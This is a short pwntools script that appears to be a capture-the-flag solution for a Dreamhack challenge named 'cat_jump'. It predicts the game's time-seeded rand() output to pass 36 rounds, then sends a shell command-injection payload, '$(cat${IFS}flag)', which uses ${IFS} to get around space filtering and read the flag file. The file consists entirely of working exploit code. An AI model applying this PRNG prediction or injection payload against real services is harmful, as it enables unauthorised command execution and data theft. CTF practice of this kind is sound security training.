from pwn import *
from ctypes import *
from ctypes.util import find_library
import base64
import time


# p = remote('host3.dreamhack.games', 17969)
p = process('./cat_jump')

c = CDLL(find_library('/lib/x86_64-linux-gnu/libc.so.6'))
c.srand(c.time(0))

obstacle = c.rand() % 2

p.recvuntil(b"left jump='h', right jump='j':")

if obstacle == 0:
    p.sendline(bytes('j', 'utf-8'))
elif obstacle == 1:
    p.sendline(bytes('h', 'utf-8'))

for i in range(36):
    try:
        recv = p.recvuntil(b":")
        c.rand()
        obstacle = c.rand() % 2
        print(recv.decode('utf-8'))
    except:
        print()
        p.interactive()

    if(obstacle == 0):
        p.sendline(bytes('j', 'utf-8'))
    if(obstacle == 1):
        p.sendline(bytes('h', 'utf-8'))

recv = p.recvuntil(b": ")
print(recv)
p.sendline(bytes('$(cat${IFS}flag)', 'utf-8'))
p.interactive()

